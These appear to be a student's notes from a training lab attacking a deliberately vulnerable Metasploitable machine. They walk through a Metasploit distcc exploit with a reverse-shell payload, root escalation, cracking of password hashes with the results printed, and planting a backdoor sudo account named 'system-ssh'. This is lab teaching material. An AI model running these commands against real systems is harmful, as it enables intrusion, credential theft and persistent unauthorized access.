Key commands include:
msfconsole: Launches MSFconsole from the command line
show + the module type: Displays all the available modules (for example: show auxiliary)
search and then a keyword: Searches for modules based on a keyword
use + module name: Selects a specific module (for example: use scanner/ftp/anonymous)
info: Displays the module details as well as the required and optional options
OR options: Just displays the options available for the module
exploit OR run: Runs the module

```
search distcc

use 0

search distcc.
use 0 or use exploit/unix/misc/distcc_exec.

1. In Metasploit, search for `distcc` and select it. 

   - `search distcc` 
   
   - `use 0` or `use exploit/unix/misc/distcc_exec`

   ![A screenshot depicts the results of the commands.](../Images/searchdistcc.PNG)

   - Explain that `distcc` is a tool for compiling code. It runs as a daemon with low permissions, and this version is vulnerable. 

2. List the options of the module, and point out that we need to set RHOSTS again as it is a required option.

   - `set RHOSTS 172.22.117.150`

3. Before running the module, we need to set a payload. List the available payloads.

   - `show payloads`
   
   - Point out the **Description** column, as it shows in parentheses how the payload is communicating.

4. Select the **reverse** payload. Be sure NOT to select **reverse_bash**, or the exploit will not work.

   - `set PAYLOAD cmd/unix/reverse`
   
   - Note that we are now using the PAYLOAD with our EXPLOIT!

5. List options again, and point out that there's a new blank setting, LHOST. This is our "listening host," which is the host that listens for the payload communication. In this case, our LHOST is the machine that we're currently operating on. Use `ifconfig` to show your IP (eth0) and set LHOST to that IP.

   - `set LHOST 172.22.117.100`

   ![A screenshot depicts the results of the `options` command.](../Images/payloadoptions.PNG)

6. Run the module.

   - `exploit` OR `run`

   ![A screenshot depicts the results of the command.](../Images/distcc.PNG)

7. Check your current user via `id`.

   - `id`

find / -type f -iname "*admin*.txt"

cat /var/tmp/adminpassword.txt

ssh msfadmin@172.22.117.150
pass: cybersecurity

ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa msfadmin@172.22.117.150

just doing `sudo su` with this password I became root

-------------------------------------------------------------------------------------

root@ip-10-0-1-231:/home/sysadmin# john crack.txt 
Loaded 6 password hashes with 6 different salts (md5crypt [MD5 32/64 X2])
Press 'q' or Ctrl-C to abort, almost any other key for status
postgres         (postgres)
user             (user)
service          (service)
123456789        (klog)
cybersecurity    (msfadmin)
Password!        (tstark)
6g 0:00:00:07 100% 2/3 0.7832g/s 12758p/s 12764c/s 12764C/s Sss2..Password!
Use the "--show" option to display all of the cracked passwords reliably
Session completed

-------------------------------------------------------------------------------------

┌──(root💀kali)-[~]
└─# ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa -p 2222 msfadmin@172.22.117.150         255 ⨯
msfadmin@172.22.117.150's password:
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
No mail.
Last login: Sat Mar 29 13:42:16 2025 from 172.22.117.100
msfadmin@metasploitable:~$

-------------------------------------------------------------------------------------

root@metasploitable:/home/msfadmin# useradd -m -s /bin/bash system-ssh
root@metasploitable:/home/msfadmin# echo "system-ssh:password" | sudo chpasswd
root@metasploitable:/home/msfadmin# usermod -aG sudo system-ssh
root@metasploitable:/home/msfadmin#
root@metasploitable:/home/msfadmin# cat /etc/passwd | grep system-ssh
system-ssh:x:1005:1005::/home/system-ssh:/bin/bash



┌──(root💀kali)-[~]
└─# ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa -p 2222 system-ssh@172.22.117.150
system-ssh@172.22.117.150's password:
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/

-------------------------------------------------------------------------------------



-------------------------------------------------------------------------------------


-------------------------------------------------------------------------------------

-------------------------------------------------------------------------------------
```